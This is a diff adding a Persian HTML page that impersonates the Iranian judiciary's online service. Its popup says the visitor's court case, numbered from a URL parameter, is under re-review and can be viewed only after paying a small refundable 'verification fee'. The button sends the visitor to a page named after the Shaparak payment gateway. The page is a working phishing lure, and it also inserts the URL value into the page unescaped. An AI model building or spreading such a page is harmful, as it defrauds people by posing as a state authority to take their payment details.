@@ -1,0 +1,50 @@
+    <!DOCTYPE html>
+    <html lang="fa">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+        <title>سامانه عدالت</title>
+        <style>
+            .custom-button {
+                font-size: 20px !important;
+                width: 230px;
+                height: 40px;
+                text-align: center;
+                
+                font-size: 20px !important;
+                width: 230px;
+                height: 40px;
+                text-align: center;
+                background-color: green; /* تنظیم رنگ سبز */
+                border-radius: 10px;
+            border: 0px solid ;
+                color: white; /* تنظیم رنگ متن */
+                border: none;
+                cursor: pointer;
+            }
+        </style>
+    </head>
+    <body>
+
+        <script>
+            function getQueryParam(param) {
+                let urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(param);
+            }
+        
+            let savedNumber = getQueryParam("number") || "شماره‌ای وارد نشده است"; // دریافت مقدار از URL
+        
+            Swal.fire({
+                html: `
+                    <h2 style="text-align: center;">توجه</h2>
+                    <hr>
+                    <p>کاربر گرامی با توجه به مشخصات وارده شما در سایت سامانه خدمات و ابلاغ الکترونیکی پرونده قضایی شما به شماره<strong>${savedNumber}</strong> به دستور مقام محترم قضایی در دستور برسی مجدد قرار گرفته است برای مشاهده نتیجه پرونده به شماره <strong>${savedNumber}</strong> مبلغ5000‌هزار تومان پرداخت کنید. پرونده قضایی فقط درون سایت قابل مشاهده می‌باشد برای پیگیری شکایت شما با پرداخت زیر احراز هویت خود را تکمیل  و پیامکی دیگر از سایت ثنا دریافت خواهید کرد که شامل مشخصات شکایت شما و متن کامل شکایت میباشد هزینه حراز هویت شما: تومان میباشد که بعد از تکمیل احراز هویت شما به حساب شما بازگردانده میشود </p>
+                    <hr>
+                    <button onclick="window.location.href='shapark.html'" class="custom-button">ورود به سامانه عدالت</button>
+                `,
+                showConfirmButton: false      
+            });
+        </script>
+    </body>
+    </html>
